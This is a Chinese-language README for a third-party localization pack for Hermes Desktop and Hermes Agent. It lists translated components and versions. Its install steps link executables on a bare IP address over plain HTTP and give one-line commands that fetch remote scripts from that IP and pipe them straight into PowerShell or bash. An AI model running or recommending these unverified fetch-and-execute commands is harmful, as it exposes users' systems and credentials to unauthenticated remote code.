# Hermes Desktop 中文增强包

面向 Hermes Desktop、Hermes Agent TUI 和 CLI 的中文增强入口。

官网入口：<http://47.121.138.43/hermes/>

## 新手安装

Windows：

下载并运行：<http://47.121.138.43/hermes/Hermes-zh-CN-Setup.exe>

macOS：

下载并解压：<http://47.121.138.43/hermes/hermes-macos-installer.zip>

然后打开 `install.command`。

## 命令行安装

Windows PowerShell：

```powershell
irm http://47.121.138.43/hermes/install.ps1 | iex
```

macOS / Linux / WSL2：

```bash
curl -fsSL http://47.121.138.43/hermes/install.sh | bash -s -- --include-desktop
```

## 平台策略

| 平台 | 推荐方式 | 说明 |
| --- | --- | --- |
| Windows | `Hermes-zh-CN-Setup.exe` | 补官方桌面端，再调用中文增强安装器 |
| macOS | `hermes-macos-installer.zip` | 生成官方 Hermes.app，再补中文增强 |
| Linux | Bash | 生成官方桌面端，再补中文增强 |

## 翻译范围

- 官方语言配置：`display.language=zh`
- CLI：`hermes_cli/*.py`
- TUI：`ui-tui/src/**/*.ts`、`ui-tui/src/**/*.tsx`
- 网关：`gateway/platforms/*.py`
- ACP：`acp_adapter/*.py`
- 平台插件：`plugins/platforms/*`
- 桌面版关联：官方桌面 App 共享同一 Hermes 核心、配置、会话、技能和 TUI 后端

## 不改的内容

- 模型生成内容
- 第三方工具返回文本
- 用户文件
- API Key
- 官方安装包签名

## 版本

- 桌面入口：2026.06.12.1
- 中文包：2026.06.12.1
- 官方 Hermes Agent：v0.16.0

## 上游

Hermes Agent 是 NousResearch 的 MIT 开源项目：<https://github.com/NousResearch/hermes-agent>
